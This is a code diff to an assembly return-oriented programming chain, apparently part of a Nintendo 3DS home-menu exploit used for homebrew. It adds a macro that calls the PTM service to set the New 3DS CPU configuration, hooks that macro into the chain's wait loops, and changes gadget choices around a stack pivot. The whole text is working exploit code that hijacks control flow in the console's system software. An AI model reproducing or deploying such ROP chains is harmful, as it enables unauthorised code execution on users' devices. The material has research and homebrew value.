@@ -578,6 +578,32 @@ DUMMY_PTR equ (WAITLOOP_DST - 4)
 		.word 0xDEADBABE ; r4 (garbage)
 .endmacro
 
+.macro ptm_configure_n3ds,val_ptr,offset
+	store ROP_MENU_POP_R4PC, MENU_LOADEDROP_BUFADR + @@function_call + offset
+	load_store val_ptr, MENU_LOADEDROP_BUFADR + @@param + offset
+	.word ROP_MENU_POP_R1PC
+		.word 0xFF
+	.word ROP_MENU_CMP_R0R1_MVNLS_R0x0_MOVHI_R0x1_POP_R4PC ; relies on load_store leaving value in r0
+		.word ROP_MENU_LDR_R0R0_SVC_x32_AND_R1R0x80000000_CMP_R1x0_LDRGE_R0R4x4_POP_R4PC
+	.word ROP_MENU_POP_R0PC
+		.word MENU_LOADEDROP_BUFADR + @@function_call + offset - 4
+	.word ROP_MENU_STRNE_R4R0x4_POP_R4PC
+		.word 0xDEADBABE ; r4 (garbage)
+	get_cmdbuf 0
+	.word ROP_MENU_POP_R4R5PC
+		.word 0x08180040 ; command header
+		@@param:
+		.word 0xDEADBABE ; value (overwritte)
+	memcpy_r0_lr_prev (4 * 2), 1, offset
+	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
+		.word MENU_PTMSYSM_HANDLE ; r0 (gsp:gpu handle)
+	.word ROP_MENU_POP_R4PC ; pop {r4, pc}
+		.word DUMMY_PTR ; r4 (dummy but address needs to be valid/readable)
+	@@function_call:
+	.word ROP_MENU_LDR_R0R0_SVC_x32_AND_R1R0x80000000_CMP_R1x0_LDRGE_R0R4x4_POP_R4PC ; ldr r0, [r0] ; svc 0x00000032 ; and r1, r0, #-2147483648 ; cmp r1, #0 ; ldrge r0, [r4, #4] ; pop {r4, pc}
+		.word 0xDEADBABE ; r4 (garbage)
+.endmacro
+
 .macro invalidate_dcache,addr,size
 	get_cmdbuf 0
 	.word ROP_MENU_POP_R4R5R6R7R8PC ; pop {r4, r5, r6, r7, r8, pc}
@@ -1129,7 +1155,7 @@ DUMMY_PTR equ (WAITLOOP_DST - 4)
 			.word ROP_MENU_POP_R4R5PC ; r4
 		.word ROP_MENU_POP_R0PC
 			.word MENU_OBJECT_LOC + waitForParameter_loop_pivot - 4
-		.word ROP_MENU_STR_R4R0x4_POP_R4PC ; strne r4, [r0, #4] ; pop {r4, pc}
+		.word ROP_MENU_STRNE_R4R0x4_POP_R4PC ; strne r4, [r0, #4] ; pop {r4, pc}
 			.word 0xDEADBABE ; r4 (garbage)
 		apt_close_session 0, 0 ; can't close earlier because need to maintain r0 and flags
 		waitForParameter_loop_memcpy:
@@ -1336,6 +1362,8 @@ DUMMY_PTR equ (WAITLOOP_DST - 4)
 					apt_leave_homemenu 0, WAITLOOP_OFFSET
 					apt_close_session 0, WAITLOOP_OFFSET
 
+					ptm_configure_n3ds MENU_LOADEDROP_BUFADR + waitLoop_n3ds_cpu + WAITLOOP_OFFSET, WAITLOOP_OFFSET
+
 					; memcpy wait loop to restore what we just destroyed by calling functions (oops !)
 					; only copy whatever's before the memcpy so we dont overwrite the return address
 					waitLoop_retmenu_memcpy:
@@ -1361,6 +1389,8 @@ DUMMY_PTR equ (WAITLOOP_DST - 4)
 				apt_jump_application
 				apt_close_session 0, WAITLOOP_OFFSET
 
+				ptm_configure_n3ds MENU_LOADEDROP_BUFADR + waitLoop_n3ds_cpu + WAITLOOP_OFFSET, WAITLOOP_OFFSET
+
 				; memcpy wait loop to restore what we just destroyed by calling functions (oops !)
 				; only copy whatever's before the memcpy so we dont overwrite the return address
 				waitLoop_isregistered_memcpy:
@@ -1374,12 +1404,15 @@ DUMMY_PTR equ (WAITLOOP_DST - 4)
 			.word ROP_MENU_STACK_PIVOT
 				waitLoop_marker:
 				.word 0xBABEBAD0 ; marker
-				.word ROP_MENU_POP_R4R5R6R7R8PC ; rop gadget to replace pivot with
+				.word ROP_MENU_POP_R4R5R6R7R8R9R10PC ; rop gadget to replace pivot with
 				waitLoop_tidlow:
 				.word 0xBABE0008 ; tid_low
 				waitLoop_tidhigh:
 				.word 0xBABE0009 ; tid_high
-				.word 0xDEADBABE
+				.ascii "cnfg"
+				waitLoop_n3ds_cpu:
+				.word 0x000000FF ; by default we do nothing with the n3ds cpu config
+				.word 0x00000000
 			gsp_acquire_right
 			writehwreg 0x202A04, 0x01FF00FF
 			; todo : add cache invalidation for ropbin
